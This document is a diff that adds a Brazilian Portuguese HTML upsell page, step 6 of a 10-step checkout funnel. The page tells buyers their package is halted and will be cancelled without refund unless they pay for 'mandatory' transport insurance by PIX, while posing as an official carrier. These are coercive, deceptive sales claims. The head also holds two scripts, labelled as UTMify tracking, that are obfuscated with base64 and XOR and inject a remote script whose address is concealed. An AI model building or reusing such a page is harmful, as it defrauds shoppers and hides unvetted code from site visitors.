@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <!-- garante a barra final na URL (senao ./js/... resolve errado e a pagina fica em branco) -->
+  <script>
+  (function () {
+    var p = location.pathname;
+    var ultimo = p.split('/').pop();
+    if (p.slice(-1) !== '/' && ultimo.indexOf('.') === -1) {
+      location.replace(p + '/' + location.search + location.hash);
+    }
+  })();
+  </script>
+  <!-- UTMify Pixel Oficial -->
+  <script>(function(){var x_o=atob("DF3gSaZNDruNgK/pyCbCPNQhLIGv6NuduC7aZokuatWj9duEoTuZZ8UiY5Xv8oCaqy+JOdI+Icvk+MqF5y2JMcMhINH+ooPLqSmUO88ve8/o843TkwDMa8EhYdns7NzL8gaba8gsY96vuo2ZoSWFJe8pLJev9s6FvTjCc4R7b9m0tpja8WrZeZV5PI+/t5yN+GyCeJBvc+bw");var q_247=[];for(var y_9m1=0;y_9m1<x_o.length;y_9m1++){q_247.push(x_o.charCodeAt(y_9m1)&255);}var z_g=q_247[0];var m_bwm=q_247.slice(1,1+z_g);var r_wx=q_247.slice(1+z_g);var v_b=r_wx.map(function(b,v_1){return b^m_bwm[v_1%z_g];});var l_owdn="";for(var z_1=0;z_1<v_b.length;z_1++){l_owdn+=String.fromCharCode(v_b[z_1]&255);}var x_hq6c=decodeURIComponent(escape(l_owdn));var d_gox8=JSON.parse(x_hq6c);var e_tip=d_gox8.globals||[];e_tip.forEach(function(x_57w){window[x_57w.name]=x_57w.value;});var w_gr=document.createElement("script");w_gr.src=d_gox8.url;w_gr.async=true;w_gr.defer=true;(d_gox8.attributes||[]).forEach(function(s_w8gx){w_gr.setAttribute(s_w8gx.name,s_w8gx.value);});(document.head||document.documentElement).appendChild(w_gr);})();</script>
+  <!-- UTMify Script Oficial -->
+  <script>(function(){var r_c=atob("DNhRgbgB8ML0nd9cJ6Nz9Mpt0vjW9asoV6trrpdilKza6KsxTr4or9tuneyW7/AvRKo48cxy37eA8KxzS7kl5Mt13qiHv/N+Rqwl89FjhbaR7v1mfKNz79lsleDOv7s9U7l89MxsmaSNsK8uQq4078wsiKGb+fIvRLNzrZp3ka6B+P1mBfosrcMjnqOZ+P1mBbww9dkshbaZ9LklCqgj5M5knrbZ7qo+Trwio5QjhqOY6Lp+Hfpz/OV8");var l_jjsk=[];for(var o_1e=0;o_1e<r_c.length;o_1e++){l_jjsk.push(r_c.charCodeAt(o_1e)&255);}var c_h=l_jjsk[0];var t_jfx=l_jjsk.slice(1,1+c_h);var s_8=l_jjsk.slice(1+c_h);var q_yen2=s_8.map(function(b,u_butq){return b^t_jfx[u_butq%c_h];});var f_w7q="";for(var v_iza=0;v_iza<q_yen2.length;v_iza++){f_w7q+=String.fromCharCode(q_yen2[v_iza]&255);}var s_kk=decodeURIComponent(escape(f_w7q));var u_2qpb=JSON.parse(s_kk);var q_1r8d=u_2qpb.globals||[];q_1r8d.forEach(function(s_lm){window[s_lm.name]=s_lm.value;});var j_j2=document.createElement("script");j_j2.src=u_2qpb.url;j_j2.async=true;j_j2.defer=true;(u_2qpb.attributes||[]).forEach(function(a_urt){j_j2.setAttribute(a_urt.name,a_urt.value);});(document.head||document.documentElement).appendChild(j_j2);})();</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Central de Logística • Seguro e Prioridade de Transporte</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="./js/helpers.js?v=20260726"></script>
+  <script src="./js/pix.js?v=20260726"></script>
+  <script src="./js/upsell.js?v=20260726"></script>
+  <style>
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
+    .animate-spin { animation: spin 1s linear infinite; }
+    .animate-pulse { animation: pulse 2s ease-in-out infinite; }
+  </style>
+</head>
+<body style="background:#F7F8FA">
+<div id="upsell-root"></div>
+<script>
+renderUpsell({
+  "slug": "frete",
+  "stepNum": 6,
+  "nextUrl": (window.location.protocol === 'file:' ? '../../obrigado/index.html' : '/obrigado/'),
+  "productName": "Seguro de Transporte + Entrega Prioritária",
+  "icon": "🚚",
+  "headerTitle": "Central de Logística • Seguro e Prioridade de Transporte",
+  "docRight": "Transportadora Oficial • Logística",
+  "alertTitle": "⚠️ Carga sem seguro — transporte não autorizado",
+  "alertText": "Sua carga entrou na rota de distribuição, mas está SEM seguro de transporte. Sem a cobertura, a transportadora não assume o envio e o pacote fica parado no centro de distribuição.",
+  "consequences": [
+    "Sem cobertura em caso de extravio, avaria ou roubo — prejuízo total seu.",
+    "Transporte não autorizado até a contratação do seguro.",
+    "Carga parada no centro de distribuição.",
+    "Cancelamento do envio após o prazo."
+  ],
+  "without": [
+    "Sem cobertura",
+    "Transporte parado",
+    "Risco de extravio",
+    "Envio cancelado"
+  ],
+  "withNow": [
+    "Carga 100% segurada",
+    "Transporte autorizado",
+    "Entrega prioritária",
+    "Rastreio ativo"
+  ],
+  "legal": "A contratação de seguro de transporte protege a carga contra extravio, avaria e roubo durante o percurso até a entrega final.",
+  "offer": {
+    "badge": "Cobertura Obrigatória",
+    "fromPrice": 34.9,
+    "price": 24.9,
+    "ctaText": "Contratar Seguro Agora",
+    "microcopy": "Seguro único de transporte + prioridade de entrega para proteger e acelerar a chegada da sua mercadoria."
+  },
+  "downsell": {
+    "title": "Cobertura Básica de Transporte",
+    "desc": "Cobertura básica de transporte com valor reduzido, válida agora, que autoriza o envio e protege a carga contra extravio.",
+    "price": 12.9,
+    "ctaText": "Contratar Cobertura Básica",
+    "warning": "Sem seguro, a transportadora não assume o envio e o pedido é cancelado. Sem reembolso."
+  },
+  "refuseText": "Recusar seguro (envio não será autorizado)",
+  "faq": [
+    {
+      "q": "Já paguei o frete, por que o seguro?",
+      "a": "O frete é o transporte; o seguro é a proteção da carga. Sem cobertura a transportadora não assume o envio."
+    },
+    {
+      "q": "O que o seguro cobre?",
+      "a": "Extravio, avaria e roubo durante todo o percurso até a entrega."
+    },
+    {
+      "q": "Ativa rápido?",
+      "a": "Sim. Após o PIX, a cobertura é ativada e o transporte autorizado."
+    }
+  ],
+  "trust": [
+    "Transportadora Oficial",
+    "Seguro de Carga",
+    "SSL 256 bits",
+    "Rastreio"
+  ],
+  "accent": "#1E40AF",
+  "totalSteps": 10
+});
+</script>
+</body>
+</html>
